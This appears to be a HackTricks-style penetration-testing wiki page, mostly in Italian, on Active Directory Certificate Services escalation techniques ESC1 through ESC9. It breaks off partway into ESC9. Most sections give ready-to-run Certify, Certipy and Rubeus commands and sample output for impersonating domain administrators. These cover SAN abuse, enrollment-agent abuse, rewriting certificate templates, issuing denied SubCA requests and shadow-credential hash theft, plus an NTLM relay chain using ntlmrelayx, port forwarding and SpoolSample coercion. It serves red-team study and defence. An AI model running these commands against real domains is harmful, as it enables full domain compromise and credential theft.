# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**This is a summary of escalation technique sections of the posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **I diritti di enrolment vengono concessi a utenti con pochi privilegi dall'Enterprise CA.**
- **L'approvazione del manager non è richiesta.**
- **Non sono necessarie firme da personale autorizzato.**
- **I descrittori di sicurezza sui template di certificato sono eccessivamente permissivi, permettendo a utenti con pochi privilegi di ottenere diritti di enrolment.**
- **I template di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
- Extended Key Usage (EKU) identifiers come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), o nessun EKU (SubCA) sono inclusi.
- **La possibilità per i richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR) è consentita dal template:**
- Active Directory (AD) dà priorità al subjectAltName (SAN) in un certificato per la verifica dell'identità se presente. Questo significa che specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (es. un domain administrator). Se un richiedente può specificare un SAN è indicato nell'oggetto AD del template di certificato tramite la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask, e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permette al richiedente di specificare il SAN.

> [!CAUTION]
> La configurazione descritta permette a utenti con pochi privilegi di richiedere certificati con qualsiasi SAN a scelta, abilitando l'autenticazione come qualsiasi principal del dominio tramite Kerberos o SChannel.

Questa funzionalità è a volte abilitata per supportare la generazione on-the-fly di certificati HTTPS o host da parte di prodotti o servizi di deployment, oppure per mancanza di comprensione.

Si osserva che creare un certificato con questa opzione genera un avviso, cosa che non avviene quando un template di certificato esistente (ad esempio il template `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) viene duplicato e poi modificato per includere un OID di autenticazione.

### Abuse

To **find vulnerable certificate templates** you can run:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Per **sfruttare questa vulnerabilità per impersonare un amministratore** si potrebbe eseguire:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Poi puoi trasformare il **certificato generato in `.pfx`** e usarlo per **autenticarti nuovamente usando Rubeus o certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
I binari di Windows "Certreq.exe" e "Certutil.exe" possono essere usati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei template di certificato nello schema di configurazione della forest AD, specificamente quelli che non richiedono approvazione o firme, che possiedono un Client Authentication o Smart Card Logon EKU, e con la flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitata, può essere eseguita eseguendo la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Spiegazione

Il secondo scenario di abuso è una variazione del primo:

1. I diritti di enrollment sono concessi agli utenti poco privilegiati dall'Enterprise CA.
2. Il requisito di approvazione da parte del responsabile è disabilitato.
3. La necessità di firme autorizzate è stata omessa.
4. Un security descriptor eccessivamente permissivo sul template del certificato concede diritti di enrollment a utenti poco privilegiati.
5. **Il template del certificato è definito per includere l'Any Purpose EKU o nessun EKU.**

L'**Any Purpose EKU** permette a un attaccante di ottenere un certificato per **qualsiasi scopo**, inclusi autenticazione client, autenticazione server, firma del codice, ecc. La stessa **technique used for ESC3** può essere impiegata per sfruttare questo scenario.

I certificati con **nessun EKU**, che fungono da certificati di CA subordinata, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere usati per firmare nuovi certificati**. Di conseguenza, un attaccante potrebbe specificare EKU arbitrari o campi nei nuovi certificati utilizzando un certificato di CA subordinata.

Tuttavia, i nuovi certificati creati per **autenticazione di dominio** non funzioneranno se la CA subordinata non è fidata dall'oggetto **`NTAuthCertificates`**, che è l'impostazione predefinita. Nonostante ciò, un attaccante può comunque creare **nuovi certificati con qualsiasi EKU** e valori arbitrari del certificato. Questi potrebbero essere potenzialmente sfruttati per un'ampia gamma di scopi (es., firma del codice, autenticazione server, ecc.) e potrebbero avere implicazioni significative per altre applicazioni nella rete come SAML, AD FS o IPSec.

Per enumerare i template che corrispondono a questo scenario all'interno dello schema di configurazione della foresta AD, può essere eseguita la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelli Enrollment Agent mal configurati - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo ma **abusando** di un **EKU diverso** (Certificate Request Agent) e di **2 template diversi** (quindi ha 2 serie di requisiti),

L'**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione Microsoft, permette a un principal di **richiedere** un **certificato** **per conto di un altro utente**.

L'**"enrollment agent"** si iscrive a un tale **template** e usa il **certificato risultante per co-firmare un CSR per conto dell'altro utente**. Successivamente **invia** il **CSR co-firmato** alla CA, iscrivendosi a un **template** che **permette "enroll on behalf of"**, e la CA risponde con un **certificato appartenente all'“altro” utente**.

**Requisiti 1:**

- I diritti di enrollment sono concessi a utenti a basso privilegio dalla Enterprise CA.
- Il requisito dell'approvazione del manager è omesso.
- Nessun requisito per firme autorizzate.
- Il security descriptor del template di certificato è eccessivamente permissivo, concedendo diritti di enrollment a utenti a basso privilegio.
- Il template di certificato include l'EKU Certificate Request Agent, abilitando la richiesta di altri template di certificato per conto di altri principal.

**Requisiti 2:**

- La Enterprise CA concede diritti di enrollment a utenti a basso privilegio.
- L'approvazione del manager viene bypassata.
- La versione dello schema del template è o 1 o superiore a 2, e specifica un Application Policy Issuance Requirement che richiede l'EKU Certificate Request Agent.
- Un EKU definito nel template di certificato permette l'autenticazione di dominio.
- Le restrizioni per gli enrollment agent non sono applicate sulla CA.

### Abuso

Puoi usare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per sfruttare questo scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Gli **utenti** che sono autorizzati a **ottenere** un **enrollment agent certificate**, i template in cui gli enrollment **agents** sono autorizzati a iscriversi e gli **account** per conto dei quali l'enrollment agent può agire possono essere limitati dalle CA aziendali. Ciò si ottiene aprendo lo snap-in `certsrc.msc`, **cliccando col tasto destro sulla CA**, **cliccando Properties**, e poi **navigando** alla scheda “Enrollment Agents”.

Tuttavia, è da notare che l'impostazione **di default** per le CA è “**Do not restrict enrollment agents**.” Quando la restrizione sugli enrollment agent viene abilitata dagli amministratori, impostandola su “Restrict enrollment agents”, la configurazione predefinita rimane estremamente permissiva. Consente a **Everyone** l'accesso per iscriversi a tutti i template come chiunque.

## Controllo degli accessi vulnerabile ai template di certificato - ESC4

### **Spiegazione**

Il **security descriptor** sui **certificate templates** definisce i **permissions** che specifici **AD principals** possiedono riguardo al template.

Se un **attacker** possiede i **permissions** necessari per **alterare** un **template** e **introdurre** qualsiasi **exploitable misconfiguration** descritte nelle **sezioni precedenti**, potrebbe essere facilitata un'elevazione di privilegi.

Permessi rilevanti applicabili ai certificate templates includono:

- **Owner:** Concede un controllo implicito sull'oggetto, permettendo la modifica di qualsiasi attributo.
- **FullControl:** Consente autorità completa sull'oggetto, inclusa la possibilità di modificare qualsiasi attributo.
- **WriteOwner:** Permette di cambiare il proprietario dell'oggetto assegnandolo a un principal sotto il controllo dell'**attacker**.
- **WriteDacl:** Permette di modificare i controlli di accesso, potenzialmente concedendo all'**attacker** FullControl.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

### **Abuso**

Per identificare i principals con diritti di modifica sui template e altri oggetti PKI, enumerare con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un esempio di privesc simile al precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 è quando un utente ha privilegi di scrittura su un modello di certificato. Questo può, per esempio, essere abusato per sovrascrivere la configurazione del modello di certificato e rendere il template vulnerabile a ESC1.

Come possiamo vedere nel percorso sopra, solo `JOHNPC` ha questi privilegi, ma il nostro utente `JOHN` ha il nuovo `AddKeyCredentialLink` edge verso `JOHNPC`. Poiché questa tecnica è legata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ecco una piccola anteprima del comando `shadow auto` di Certipy per recuperare l'NT hash della vittima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** può sovrascrivere la configurazione di un modello di certificato con un singolo comando. Per **impostazione predefinita**, Certipy **sovrascriverà** la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il **`-save-old` parametro per salvare la vecchia configurazione**, che sarà utile per **ripristinare** la configurazione dopo il nostro attacco.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Spiegazione

La fitta rete di relazioni interconnesse basate su ACL, che include diversi oggetti oltre ai certificate templates e alla certificate authority, può influenzare la sicurezza dell'intero sistema AD CS. Questi oggetti, che possono incidere significativamente sulla sicurezza, comprendono:

- L'AD computer object del server CA, che può essere compromesso tramite meccanismi come S4U2Self o S4U2Proxy.
- Il server RPC/DCOM del server CA.
- Qualsiasi oggetto AD discendente o contenitore all'interno del percorso specifico del contenitore `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, ma non si limita a, contenitori e oggetti come il Certificate Templates container, il Certification Authorities container, il NTAuthCertificates object e l'Enrollment Services Container.

La sicurezza del sistema PKI può essere compromessa se un attaccante con privilegi bassi riesce a prendere il controllo di uno qualsiasi di questi componenti critici.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L'argomento trattato nel [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) tocca anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come descritto da Microsoft. Questa configurazione, quando attivata su una Certification Authority (CA), permette l'inclusione di **valori definiti dall'utente** nel **subject alternative name** per **qualsiasi richiesta**, incluse quelle costruite da Active Directory®. Di conseguenza, questa disposizione consente a un **intruso** di iscriversi tramite **qualsiasi template** configurato per l'**autenticazione** di dominio—specificamente quelli aperti all'iscrizione da parte di utenti **non privilegiati**, come il template User standard. Come risultato, può essere ottenuto un certificato che permette all'intruso di autenticarsi come domain administrator o **qualsiasi altra entità attiva** all'interno del dominio.

**Nota**: L'approccio per aggiungere **alternative names** in una Certificate Signing Request (CSR), tramite l'argomento `-attrib "SAN:"` in `certreq.exe` (indicato come “Name Value Pairs”), presenta un **contrasto** rispetto alla strategia di sfruttamento delle SAN in ESC1. Qui, la distinzione risiede in **come le informazioni dell'account sono incapsulate**—all'interno di un attributo del certificato, piuttosto che in un'estensione.

### Abuso

Per verificare se l'impostazione è attivata, le organizzazioni possono utilizzare il seguente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Questa operazione impiega essenzialmente **accesso remoto al registro**, quindi un approccio alternativo potrebbe essere:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa misconfigurazione e sfruttarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Per modificare queste impostazioni, supponendo di possedere **domain administrative** rights o equivalenti, il seguente comando può essere eseguito da qualsiasi workstation:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i nuovi **certificates** conterranno una **security extension** che incorpora la **requester's `objectSid` property**. Per ESC1, questo SID è derivato dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia il **requester's `objectSid`**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia suscettibile a ESC10 (Weak Certificate Mappings), che prioritizza il **SAN rispetto alla nuova security extension**.

## Controllo degli Accessi della Certificate Authority vulnerabile - ESC7

### Attacco 1

#### Spiegazione

Il controllo degli accessi per una Certificate Authority è mantenuto tramite un insieme di permessi che governano le azioni della CA. Questi permessi possono essere visualizzati aprendo `certsrv.msc`, facendo clic con il tasto destro su una CA, selezionando Proprietà e poi andando alla scheda Sicurezza. Inoltre, i permessi possono essere enumerati usando il modulo PSPKI con comandi come:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Avere i diritti **`ManageCA`** su una certificate authority permette al principal di manipolare le impostazioni da remoto usando PSPKI. Questo include l'attivazione/disattivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire la specifica del SAN in qualsiasi template, un aspetto critico per la domain escalation.

La semplificazione di questo processo è ottenibile tramite l'uso del cmdlet PSPKI **Enable-PolicyModuleFlag**, che consente modifiche senza interagire direttamente con la GUI.

Il possesso dei diritti **`ManageCertificates`** facilita l'approvazione delle richieste in sospeso, eludendo di fatto il meccanismo di "CA certificate manager approval".

Una combinazione dei moduli **Certify** e **PSPKI** può essere utilizzata per richiedere, approvare e scaricare un certificato:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Spiegazione

> [!WARNING]
> Nell'**precedente attack** **`Manage CA`** i permessi sono stati usati per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** per eseguire l'**ESC6 attack**, ma questo non avrà alcun effetto finché il servizio CA (`CertSvc`) non viene riavviato. Quando un utente ha il diritto di accesso `Manage CA`, all'utente è anche consentito **riavviare il servizio**. Tuttavia, ciò **non significa che l'utente possa riavviare il servizio da remoto**. Inoltre, E**SC6 might not work out of the box** nella maggior parte degli ambienti aggiornati a causa degli aggiornamenti di sicurezza di maggio 2022.

Pertanto, qui viene presentato un altro attack.

Prerequisiti:

- Solo il permesso **`ManageCA`**
- Permesso **`Manage Certificates`** (può essere concesso da **`ManageCA`**)
- Il template di certificato **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con i diritti di accesso `Manage CA` _e_ `Manage Certificates` possono **emettere richieste di certificato fallite**. Il template di certificato **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono iscriversi al template. Pertanto, un **utente** può **richiedere** di iscriversi al **`SubCA`** — richiesta che verrà **negata** — ma poi la certificazione può essere **emessa dal responsabile** successivamente.

#### Abuso

Puoi **concederti il diritto di accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo incaricato.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Il template **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul template `SubCA`**.

**Questa richiesta verrà rifiutata**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con le nostre **`Manage CA` e `Manage Certificates`**, possiamo quindi **emettere la richiesta di certificato fallita** con il comando `ca` e il parametro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attacco 3 – Abuso dell’estensione Manage Certificates (SetExtension)

#### Spiegazione

Oltre agli abusi classici ESC7 (abilitare gli attributi EDITF o approvare richieste in sospeso), **Certify 2.0** ha rivelato una nuova primitiva che richiede solo il ruolo *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) sulla Enterprise CA.

Il metodo RPC `ICertAdmin::SetExtension` può essere eseguito da qualsiasi principal che detenga *Manage Certificates*. Mentre il metodo veniva tradizionalmente usato dalle CA legittime per aggiornare le estensioni su richieste **in sospeso**, un attacker può abusarne per **apporre una estensione di certificato *non predefinita*** (ad esempio una *Certificate Issuance Policy* OID personalizzata come `1.1.1.1`) a una richiesta in attesa di approvazione.

Poiché il template target **non definisce un valore predefinito per quella estensione**, la CA NON sovrascriverà il valore controllato dall’attaccante quando la richiesta verrà infine emessa. Il certificato risultante contiene quindi un’estensione scelta dall’attaccante che può:

* Soddisfare requisiti di Application / Issuance Policy di altri template vulnerabili (portando a privilege escalation).
* Iniettare EKU o policy aggiuntive che concedono al certificato una fiducia inaspettata in sistemi di terze parti.

In breve, *Manage Certificates* – precedentemente considerato la “metà meno potente” di ESC7 – può ora essere sfruttato per escalation di privilegi completa o persistenza a lungo termine, senza modificare la configurazione della CA o richiedere il più restrittivo diritto *Manage CA*.

#### Abusare della primitiva con Certify 2.0

1. **Sottomettere una richiesta di certificato che rimarrà *in sospeso*.** Questo può essere forzato con un template che richiede l’approvazione del manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Aggiungere un’estensione personalizzata alla richiesta in sospeso** usando il nuovo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se il template non definisce già l’estensione *Certificate Issuance Policies*, il valore sopra sarà preservato dopo l’emissione.*

3. **Emettere la richiesta** (se il tuo ruolo dispone anche dei diritti di approvazione *Manage Certificates*) oppure attendere che un operatore la approvi. Una volta emessa, scarica il certificato:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Il certificato risultante contiene ora l’OID malicious di issuance-policy e può essere utilizzato in attacchi successivi (es. ESC13, escalation di dominio, ecc.).

> NOTA: Lo stesso attacco può essere eseguito con Certipy ≥ 4.7 tramite il comando `ca` e il parametro `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Spiegazione

> [!TIP]
> In ambienti in cui **AD CS è installato**, se esiste un **web enrollment endpoint vulnerabile** e almeno un **certificate template è pubblicato** che permette **domain computer enrollment e client authentication** (come il template di default **`Machine`**), diventa possibile che **qualsiasi computer con il spooler service attivo venga compromesso da un attacker**!

Diversi **metodi di enrollment basati su HTTP** sono supportati da AD CS, resi disponibili tramite ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per l’enrollment basato su HTTP sono suscettibili a **NTLM relay attacks**. Un attacker, partendo da una macchina compromessa, può impersonare qualsiasi account AD che si autentica tramite NTLM in ingresso. Mentre impersona l’account vittima, queste interfacce web possono essere accessibili dall’attacker per **richiedere un certificato client per l’autenticazione usando i template `User` o `Machine`**.

- L’**interfaccia di web enrollment** (una vecchia applicazione ASP disponibile su `http://<caserver>/certsrv/`) è di default solo HTTP, il che non offre protezione contro NTLM relay attacks. Inoltre, essa esplicitamente permette solo NTLM tramite il suo Authorization HTTP header, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il **Certificate Enrollment Policy** (CEP) Web Service, e il **Network Device Enrollment Service** (NDES) di default supportano l’autenticazione negotiate tramite il loro Authorization HTTP header. Negotiate authentication **supporta sia** Kerberos che **NTLM**, permettendo a un attacker di **degradare a NTLM** l’autenticazione durante attacchi di relay. Sebbene questi web service abilitino HTTPS per default, HTTPS da solo **non protegge contro NTLM relay attacks**. La protezione da NTLM relay per servizi HTTPS è possibile solo quando HTTPS è combinato con channel binding. Purtroppo, AD CS non attiva Extended Protection for Authentication su IIS, che è richiesta per il channel binding.

Un problema comune negli NTLM relay attacks è la **breve durata delle sessioni NTLM** e l’impossibilità per l’attacker di interagire con servizi che **richiedono NTLM signing**.

Tuttavia, questa limitazione viene superata sfruttando un NTLM relay attack per ottenere un certificato per l’utente, poiché il periodo di validità del certificato determina la durata della sessione, e il certificato può essere impiegato con servizi che **esigono NTLM signing**. Per istruzioni sull’utilizzo di un certificato rubato, fare riferimento a:


{{#ref}}
account-persistence.md
{{#endref}}

Un’altra limitazione degli NTLM relay attacks è che **una macchina controllata dall’attaccante deve essere autenticata da un account vittima**. L’attaccante può scegliere di aspettare oppure tentare di **forzare** questa autenticazione:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

Il comando `cas` di [**Certify**](https://github.com/GhostPack/Certify) enumera gli **endpoint HTTP AD CS abilitati**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` viene usata dalle Autorità di Certificazione aziendali (CA) per memorizzare gli endpoint del Certificate Enrollment Service (CES). Questi endpoint possono essere analizzati e elencati utilizzando lo strumento **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La richiesta di un certificato viene effettuata da Certipy per impostazione predefinita basandosi sul template `Machine` o `User`, determinato dal fatto che il nome dell'account soggetto a relay termini con `$`. La specifica di un template alternativo può essere ottenuta tramite l'uso del parametro `-template`.

Una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) può quindi essere impiegata per forzare l'autenticazione. Quando si lavora con i controller di dominio, è necessario specificare `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

Il nuovo valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) per **`msPKI-Enrollment-Flag`**, denominato ESC9, impedisce l'incorporamento della **nuova estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`** in un certificato. Questa flag diventa rilevante quando `StrongCertificateBindingEnforcement` è impostato su `1` (impostazione predefinita), in contrasto con un'impostazione di `2`. La sua importanza aumenta in scenari dove una mappatura del certificato più debole per Kerberos o Schannel potrebbe essere sfruttata (come in ESC10), dato che l'assenza di ESC9 non altererebbe i requisiti.

Le condizioni in cui l'impostazione di questa flag diventa significativa includono:

- `StrongCertificateBindingEnforcement` non è impostato su `2` (il valore predefinito è `1`), oppure `CertificateMappingMethods` include la flag `UPN`.
- Il certificato è contrassegnato con la flag `CT_FLAG_NO_SECURITY_EXTENSION` nella impostazione `msPKI-Enrollment-Flag`.
- Il certificato specifica qualsiasi client authentication EKU.
- Sono disponibili permessi `GenericWrite` su un account per compromettere un altro.

### Abuse Scenario

Supponiamo che `John@corp.local` possieda permessi `GenericWrite` su `Jane@corp.local`, con l'obiettivo di compromettere `Administrator@corp.local`. Il template di certificato `ESC9`, al quale `Jane@corp.local` è autorizzata a enrollare, è configurato con la flag `CT_FLAG_NO_SECURITY_EXTENSION` nella impostazione `msPKI-Enrollment-Flag`.

Inizialmente l'hash di Jane viene acquisito usando Shadow Credentials, grazie ai permessi `GenericWrite` di John:
```bash
